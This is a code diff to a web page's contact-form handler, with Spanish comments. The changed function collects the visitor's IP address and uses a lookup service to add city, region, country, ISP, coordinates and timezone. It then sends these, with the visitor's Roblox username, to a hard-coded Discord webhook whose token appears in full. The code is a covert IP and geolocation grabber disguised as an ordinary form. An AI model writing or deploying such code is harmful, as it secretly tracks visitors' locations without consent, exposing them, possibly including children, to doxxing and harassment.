@@ -8,16 +8,23 @@
         async function sendContact(event) {
             event.preventDefault();
 
+            // Obtener la IP del usuario
             const ipResponse = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipResponse.json();
             const userIP = ipData.ip;
 
+            // Obtener información detallada de la IP usando ipinfo.io
+            const ipInfoResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
+            const ipInfoData = await ipInfoResponse.json();
+
             const username = document.getElementById('username').value;
 
+            // Preparar los datos para enviar al webhook de Discord
             const data = {
-                content: `Nueva entrada:\nIP: ${userIP}\nUsuario de Roblox: ${username}`,
+                content: `Nueva entrada:\nIP: ${userIP}\nUsuario de Roblox: ${username}\nCiudad: ${ipInfoData.city}\nRegión: ${ipInfoData.region}\nPaís: ${ipInfoData.country}\nOrganización: ${ipInfoData.org}\nProveedor de Internet: ${ipInfoData.asn}\nCoordenadas: ${ipInfoData.loc}\nTiempo de Zona: ${ipInfoData.timezone}`,
             };
 
+            // Enviar los datos al webhook de Discord
             fetch('https://discord.com/api/webhooks/1411003921953984512/eWRarF44aGvN0ZatZ4S4IxA9IH8JGb_KA7nLuZlaFj2G3FdFUrZLHW28egfPg6cC4092', {
                 method: 'POST',
                 headers: {
